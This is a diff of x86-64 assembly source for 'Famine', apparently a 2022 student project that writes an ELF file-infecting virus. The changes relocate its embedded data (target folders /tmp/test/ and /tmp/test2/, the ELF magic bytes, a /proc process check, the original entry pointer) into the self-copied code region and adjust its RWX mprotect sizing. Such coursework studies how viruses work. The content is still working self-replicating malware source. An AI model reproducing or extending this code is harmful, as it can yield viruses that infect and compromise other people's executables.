@@ -45,9 +45,8 @@ sc:
 				jmp				.loop
 .end:
 				lea				rdi,					[rel sc]
-				add				rdi,					sc_end - sc
 				and				rdi,					0xfffffffffffff000
-				mov				rsi,					sc_data_end - sc_data
+				mov				rsi,					sc_end - sc
 				add				rsi,					0x1000
 				mov				rdx,					7
 				mov				rax,					10
@@ -55,11 +54,7 @@ sc:
 
 				mov				qword[rel sc_glob],		rsp
 
-				mov				qword[rsp+0x20],		sc_end - sc
-				mov				qword[rsp+0x28],		sc_data_end - sc_data
-				mov				rax,					qword[rsp+0x20]
-				add				rax,					qword[rsp+0x28]
-				mov				qword[rsp+0x30],		rax
+				mov				qword[rsp+0x30],		sc_end - sc
 				mov				rax,					qword[rel sc_real_entry]
 				mov				qword[rsp+0xc70],		rax
 				mov				rax,					qword[rel sc_child]
@@ -91,6 +86,8 @@ sc:
 				mov				rsp,					rbp
 				pop				rbp
 				jmp				rax
+sc_alloc:
+				dq				14 * 8 + 3 * 1024
 sc_proc_dir:
 				push			rbp
 				mov				rbp,					rsp
@@ -160,6 +157,9 @@ sc_proc_dir:
 				mov				rsp,					rbp
 				pop				rbp
 				ret
+sc_excl_proc:
+				db				"excl_proc.sh" ; max len = 15
+sc_excl_proc_end:
 sc_proc_entries:
 				xchg			rdi,					rsi
 				add				rsi,					18
@@ -221,6 +221,8 @@ sc_proc_entries:
 .end:
 				xor				rax,					rax
 				ret
+sc_status:
+				db				"/status", 0
 sc_proc_pids:
 				push			rbp
 				mov				rbp,					rsp
@@ -495,6 +497,8 @@ sc_test_elf_hdr:
 .error:
  				mov				rax,					-1
 				ret
+sc_child:
+				dq				0
 sc_write_mem:
 				push			rbp
 				mov				rbp,					rsp
@@ -586,6 +590,8 @@ sc_write_mem:
  				mov				rsp,					rbp	
 				pop				rbp
 				ret
+sc_ident:
+				db				0x7f, "ELF", 0x2
 sc_map_file:
 				push			rbp
 				mov				rbp,					rsp
@@ -654,6 +660,8 @@ sc_map_file:
 				mov				rsp,					rbp
 				pop				rbp
 				ret
+sc_real_entry:
+				dq				sc_first_real_entry
 sc_file_cpy:
 				push			rbp
 				mov				rbp,					rsp
@@ -695,6 +703,8 @@ sc_file_cpy:
 				mov				rsp,					rbp
 				pop				rbp
 				ret
+sc_entry:
+				dq				sc
 sc_write_pad:
 				push			rbp
 				mov				rbp,					rsp
@@ -737,6 +747,8 @@ sc_write_pad:
 				mov				rsp,					rbp
 				pop				rbp
 				ret
+sc_dir_proc:
+				db				"/proc/", 0
 sc_get_fd_size:
 				push			rbp
 				mov				rbp,					rsp
@@ -771,6 +783,8 @@ sc_get_fd_size:
 				mov				rsp,					rbp
 				pop				rbp
 				ret
+sc_dir_2:
+				db				"/tmp/test2/", 0
 sc_str_n_cmp:
 				xor				rax,					rax
 .loop:
@@ -791,6 +805,8 @@ sc_str_n_cmp:
 .end:
 				sub				al,						byte[rsi]
 				ret
+sc_dir_1:
+				db				"/tmp/test/", 0
 sc_get_full_path:
 .loop_1:
  				cmp				byte[rdi],				0
@@ -813,34 +829,10 @@ sc_get_full_path:
 .end:
  				mov				byte[rdx],				0
 				ret
-sc_end:
-
-sc_data:
-sc_dir_1:
-				db				"/tmp/test/", 0
-sc_dir_2:
-				db				"/tmp/test2/", 0
-sc_dir_proc:
-				db				"/proc/", 0
-sc_entry:
-				dq				sc
-sc_real_entry:
-				dq				sc_first_real_entry
-sc_ident:
-				db				0x7f, "ELF", 0x2
-sc_child:
-				dq				0
-sc_alloc:
-				dq				14 * 8 + 3 * 1024
-sc_status:
-				db				"/status", 0
-sc_excl_proc:
-				db				"excl_proc.sh" ; max len = 15
-sc_excl_proc_end:
 sc_glob:
 				dq				0	; +0x18		->	sz.mem
-									; +0x20		->	sz.code
-									; +0x28		->	sz.data
+									; +0x20		->	sz.code			; unused
+									; +0x28		->	sz.data			; unused
 									; +0x30		->	sz.load
 									; +0x38		->	sz.f_pad
 									; +0x40		->	sz.m_pad
@@ -860,8 +852,7 @@ sc_glob:
 									; +0xc80	-> 	entry
 sc_sign:
 				db				"Famine (42 project) - 2022 - by apitoise & fcadet", 0
-sc_data_end:
-
+sc_end:
 sc_first_real_entry:
 				xor				rdi,				rdi
 				mov				rax,				60
